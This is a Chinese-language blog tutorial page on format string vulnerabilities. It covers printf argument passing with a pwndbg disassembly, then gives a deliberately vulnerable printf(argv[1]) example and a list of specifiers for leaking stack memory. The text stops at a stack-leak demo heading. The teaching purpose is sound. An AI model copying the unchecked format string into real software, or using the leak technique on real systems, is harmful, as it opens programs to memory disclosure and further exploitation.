@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="arch3rn4r">
+    
+    <title>
+        
+            格式化字符串漏洞 |
+        
+        arch3rn4r
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/brands.min.css">
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"arch3rn4r.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"arch3rn4r","author":"arch3rn4r","avatar":"/images/beauty/myhead.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                    || fa-solid fa-tags","about":"/about                || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/beauty/bg.jpg","background_img_dark":"https://arch3rn4r.github.io/picx-images-hosting/20240915/EYnModKVcAAy6sw.4g4g8oqoi0.webp","description":"这里是雨季，你那里阳光明媚吗","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":"ture"},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default","code_block_shrink":false},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":"arch3rn4r/arch3rn4r.github.io","repo_id":"R_kgDOLnMFhw","category":"Announcements","category_id":"DIC_kwDOLnMFh84Cik-D","reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom.css"],"js":[null]},"root":"","source_data":{},"version":"4.2.3"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="arch3rn4r" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+            <a class="site-name border-box" href="/">
+               arch3rn4r
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        格式化字符串漏洞
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/beauty/myhead.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">arch3rn4r</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-09-16 21:07:42</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Fri May 02 2025 10:41:59 GMT+0800">2025-05-02 10:41:59</span>
+            </span>
+        
+
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.9k 字</span>
+            </span>
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先来看printf,这是常用的格式化字符串函数，以下是常见用法，能利用%s,%d等来替换不同的值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s!\n&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;There are %d lights!&quot;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The average of %d, %d, and %d is %f&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="type">float</span>(<span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>)/<span class="number">3.0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但是printf是怎么知道有多少个值的？</p>
+<p>格式化字符串决定了printf打印的参数类型，那么这些参数在哪里？</p>
+<p>比如给定了许多%s,但没有指定参数传递，printf如何打印？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s!\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>来看看会调用printf时的汇编代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">  <span class="type">int</span> c=<span class="number">3</span>;</span><br><span class="line">  <span class="type">int</span> d=<span class="number">4</span>;</span><br><span class="line">  <span class="type">int</span> e=<span class="number">5</span>;</span><br><span class="line">  <span class="type">int</span> f=<span class="number">6</span>;</span><br><span class="line">  <span class="type">int</span> g=<span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d %d %d %d\n&quot;</span>,a,b,c,d,e,f,g);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启用gdb，看printf是怎么调用函数的</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">For help, type <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">pwndbg: loaded <span class="number">161</span> pwndbg commands <span class="keyword">and</span> <span class="number">47</span> shell commands. Type pwndbg [--shell | --all] [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created $rebase, $base, $<span class="function">ida GDB <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Reading symbols from ./<span class="keyword">do</span>...</span></span><br><span class="line"><span class="function"><span class="params">(No debugging symbols found in ./<span class="keyword">do</span>)</span></span></span><br><span class="line"><span class="function">------- tip of the <span class="title">day</span> <span class="params">(disable with set show-tips off)</span> -------</span></span><br><span class="line"><span class="function">Use Pwndbg&#x27;s config <span class="keyword">and</span> theme commands to tune its configuration <span class="keyword">and</span> theme colors!</span></span><br><span class="line"><span class="function">pwndbg&gt; disass main</span></span><br><span class="line"><span class="function">Dump of assembler code <span class="keyword">for</span> function main:</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001139</span> &lt;+<span class="number">0</span>&gt;:     push   rbp</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000113a</span> &lt;+<span class="number">1</span>&gt;:     mov    rbp,rsp</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000113d</span> &lt;+<span class="number">4</span>&gt;:     sub    rsp,<span class="number">0x30</span></span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001141</span> &lt;+<span class="number">8</span>&gt;:     mov    DWORD PTR [rbp<span class="number">-0x24</span>],edi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001144</span> &lt;+<span class="number">11</span>&gt;:    mov    QWORD PTR [rbp<span class="number">-0x30</span>],rsi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001148</span> &lt;+<span class="number">15</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x4</span>],<span class="number">0x1</span>                                </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000114f</span> &lt;+<span class="number">22</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x8</span>],<span class="number">0x2</span>                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001156</span> &lt;+<span class="number">29</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0xc</span>],<span class="number">0x3</span>                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000115d</span> &lt;+<span class="number">36</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x10</span>],<span class="number">0x4</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001164</span> &lt;+<span class="number">43</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x14</span>],<span class="number">0x5</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000116b</span> &lt;+<span class="number">50</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x18</span>],<span class="number">0x6</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001172</span> &lt;+<span class="number">57</span>&gt;:    mov    DWORD PTR [rbp<span class="number">-0x1c</span>],<span class="number">0x7</span>                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001179</span> &lt;+<span class="number">64</span>&gt;:    mov    r8d,DWORD PTR [rbp<span class="number">-0x14</span>]                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000117d</span> &lt;+<span class="number">68</span>&gt;:    mov    edi,DWORD PTR [rbp<span class="number">-0x10</span>]                                                                </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001180</span> &lt;+<span class="number">71</span>&gt;:    mov    ecx,DWORD PTR [rbp<span class="number">-0xc</span>]                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001183</span> &lt;+<span class="number">74</span>&gt;:    mov    edx,DWORD PTR [rbp<span class="number">-0x8</span>]                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001186</span> &lt;+<span class="number">77</span>&gt;:    mov    eax,DWORD PTR [rbp<span class="number">-0x4</span>]                                                                 </span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001189</span> &lt;+<span class="number">80</span>&gt;:    mov    esi,DWORD PTR [rbp<span class="number">-0x1c</span>]</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000118c</span> &lt;+<span class="number">83</span>&gt;:    push   rsi</span></span><br><span class="line"><span class="function">   <span class="number">0x000000000000118d</span> &lt;+<span class="number">84</span>&gt;:    mov    esi,DWORD PTR [rbp<span class="number">-0x18</span>]</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001190</span> &lt;+<span class="number">87</span>&gt;:    push   rsi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001191</span> &lt;+<span class="number">88</span>&gt;:    mov    r9d,r8d</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001194</span> &lt;+<span class="number">91</span>&gt;:    mov    r8d,edi</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001197</span> &lt;+<span class="number">94</span>&gt;:    mov    esi,eax</span></span><br><span class="line"><span class="function">   <span class="number">0x0000000000001199</span> &lt;+<span class="number">96</span>&gt;:    lea    rax,[rip+<span class="number">0xe64</span>]        # <span class="number">0x2004</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011a0</span> &lt;+<span class="number">103</span>&gt;:   mov    rdi,rax</span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011a3</span> &lt;+<span class="number">106</span>&gt;:   mov    eax,<span class="number">0x0</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011a8</span> &lt;+<span class="number">111</span>&gt;:   call   <span class="number">0x1030</span> &lt;printf@plt&gt;</span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011ad</span> &lt;+<span class="number">116</span>&gt;:   add    rsp,<span class="number">0x10</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011b1</span> &lt;+<span class="number">120</span>&gt;:   mov    eax,<span class="number">0x0</span></span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011b6</span> &lt;+<span class="number">125</span>&gt;:   leave</span></span><br><span class="line"><span class="function">   <span class="number">0x00000000000011b7</span> &lt;+<span class="number">126</span>&gt;:   ret</span></span><br><span class="line"><span class="function">End of assembler dump.</span></span><br><span class="line"><span class="function">pwndbg&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p>在&lt;111&gt;处调用了printf</p>
+<p>在此处下断点 b *main +111</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *main+<span class="number">111</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x11a8</span></span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure>
+
+<p>运行后看现在的寄存器里有什么</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">rax            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">rbx            <span class="number">0x7fffffffdf28</span>      <span class="number">140737488346920</span></span><br><span class="line">rcx            <span class="number">0x3</span>                 <span class="number">3</span></span><br><span class="line">rdx            <span class="number">0x2</span>                 <span class="number">2</span></span><br><span class="line">rsi            <span class="number">0x1</span>                 <span class="number">1</span></span><br><span class="line">rdi            <span class="number">0x555555556004</span>      <span class="number">93824992239620</span></span><br><span class="line">rbp            <span class="number">0x7fffffffde10</span>      <span class="number">0x7fffffffde10</span></span><br><span class="line">rsp            <span class="number">0x7fffffffddd0</span>      <span class="number">0x7fffffffddd0</span></span><br><span class="line">r8             <span class="number">0x4</span>                 <span class="number">4</span></span><br><span class="line">r9             <span class="number">0x5</span>                 <span class="number">5</span></span><br><span class="line">r10            <span class="number">0x7fffffffdb40</span>      <span class="number">140737488345920</span></span><br><span class="line">r11            <span class="number">0x206</span>               <span class="number">518</span></span><br><span class="line">r12            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">r13            <span class="number">0x7fffffffdf38</span>      <span class="number">140737488346936</span></span><br><span class="line">r14            <span class="number">0x7ffff7ffd000</span>      <span class="number">140737354125312</span></span><br><span class="line">r15            <span class="number">0x555555557dd8</span>      <span class="number">93824992247256</span></span><br><span class="line">rip            <span class="number">0x5555555551a8</span>      <span class="number">0x5555555551a8</span> &lt;main+<span class="number">111</span>&gt;</span><br><span class="line">eflags         <span class="number">0x202</span>               [ IF ]</span><br><span class="line">cs             <span class="number">0x33</span>                <span class="number">51</span></span><br><span class="line">ss             <span class="number">0x2b</span>                <span class="number">43</span></span><br><span class="line">ds             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">es             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">fs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">gs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+
+<p>对于寄存器的一些解释：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rax (<span class="number">0x0</span>): 通常用作返回值寄存器。值为 <span class="number">0</span> 表示前一个函数调用返回了 <span class="number">0</span>（通常表示成功，或者是布尔类型的 <span class="literal">false</span>）。</span><br><span class="line">rbx (<span class="number">0x7fffffffdf28</span>): rbx 通常是一个保存寄存器，它的值为 <span class="number">140737488346920</span>（内存地址），说明它保存了某个值或指向某个数据。</span><br><span class="line">rcx (<span class="number">0x3</span>): rcx 经常在某些函数调用约定中用于传递参数。当前值为 <span class="number">3</span>，表明它可能作为一个函数的第三个参数或计数值。</span><br><span class="line">rdx (<span class="number">0x2</span>): rdx 通常用于传递第二个函数参数，当前值为 <span class="number">2</span>，表明这个值可能被用作函数调用中的某个参数。</span><br><span class="line">rsi (<span class="number">0x1</span>): rsi 通常是传递第一个函数参数。当前值为 <span class="number">1</span>，很可能是某个函数的标志参数或索引。</span><br><span class="line">rdi (<span class="number">0x555555556004</span>): rdi 经常传递第一个函数参数，当前值为 <span class="number">93824992239620</span>，这是一个内存地址，可能指向函数的输入数据或结构体。</span><br><span class="line">rbp (<span class="number">0x7fffffffde10</span>): rbp 是基址指针，通常用于指向栈帧的基址。当前值指向栈帧顶部，表示函数的局部变量和参数保存在这一段内存区域中。</span><br><span class="line">rsp (<span class="number">0x7fffffffddd0</span>): rsp 是栈指针，表示当前栈的顶部。当前值 <span class="number">0x7fffffffddd0</span> 小于 rbp，符合栈从高地址向低地址增长的特性。</span><br><span class="line">r8 (<span class="number">0x4</span>), r9 (<span class="number">0x5</span>): 这些寄存器在某些调用约定下用于传递函数参数，值分别为 <span class="number">4</span> 和 <span class="number">5</span>。</span><br><span class="line">r10 (<span class="number">0x7fffffffdb40</span>): 这是一个内存地址，可能用作系统调用的第三个参数或者是某个函数的额外参数。</span><br><span class="line">r11 (<span class="number">0x206</span>): 通常用作标志寄存器。当前值 <span class="number">0x206</span> 可能与系统调用相关。</span><br><span class="line">r12 (<span class="number">0x0</span>): r12 是一个保存寄存器，当前值为 <span class="number">0</span>，表示它可能还未被使用。</span><br><span class="line">r13 (<span class="number">0x7fffffffdf38</span>): 这是一个内存地址，通常保存了一个值或指向某个数据区域。</span><br><span class="line">r14 (<span class="number">0x7ffff7ffd000</span>): 这个地址位于共享库的区域（通常在高地址），可能是指向某个动态库的基地址。</span><br><span class="line">r15 (<span class="number">0x555555557dd8</span>): 这个地址位于程序的代码段或数据段，可能指向某个全局变量或静态数据。</span><br></pre></td></tr></table></figure>
+
+<p>rdi 里是格式化字符串</p>
+<p>前面显示了12345，67呢</p>
+<p>在这里</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx $rsp</span><br><span class="line"><span class="number">0x7fffffffddd0</span>: <span class="number">0x0000000000000006</span>      <span class="number">0x0000000000000007</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>: <span class="number">0x00007fffffffdf28</span>      <span class="number">0x0000000100000000</span></span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+
+<p>数据依次排列而printf依次读取</p>
+<h3 id="格式化字符串漏洞的条件"><a href="#格式化字符串漏洞的条件" class="headerlink" title="格式化字符串漏洞的条件"></a>格式化字符串漏洞的条件</h3><p>用户能控制传递给printf的首个参数。格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>格式化字符串在循环中是图灵完备的，以下这个项目基于运行在while循环中的printf,brainfuck</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/HexHive/printbf" >https://github.com/HexHive/printbf<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="其他格式化字符串函数"><a href="#其他格式化字符串函数" class="headerlink" title="其他格式化字符串函数"></a>其他格式化字符串函数</h3><ul>
+<li><p>用于内部逻辑，而不是输入&#x2F;输出操作（例如，<code>sprintf</code>，<code>snprintf</code>，<code>sscanf</code>）</p>
+</li>
+<li><p>用于日志记录（例如，<code>fprintf</code>）</p>
+</li>
+<li><p>用于输入（例如，<code>scanf</code></p>
+</li>
+</ul>
+<h2 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h2><p>可以使用的字符串</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%c: read a <span class="type">char</span> off the <span class="built_in">stack</span>   泄露一个字节</span><br><span class="line">%d, %i, %x: read an <span class="title function_">int</span> <span class="params">(<span class="number">4</span> bytes)</span> off the <span class="built_in">stack</span> 以十进制整数形式泄露4字节</span><br><span class="line">%x: read an <span class="title function_">int</span> <span class="params">(<span class="number">4</span> bytes)</span> in hex  以十六进制整数形式泄露4字节</span><br><span class="line">%s: dereference a pointer and read out bytes until a null byte  解引用指针，并读取任意字节，直到遇到null字节，这些字节可能是可显或不可显</span><br></pre></td></tr></table></figure>
+
+<p>格式化字符串也能使用大小前缀，或叫大小修饰符</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%x leaks <span class="number">4</span> bytes</span><br><span class="line">%hx leaks <span class="number">2</span> bytes</span><br><span class="line">%hhx leaks <span class="number">1</span> byte</span><br><span class="line">%lx leaks <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure>
+
+<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>demo</p>
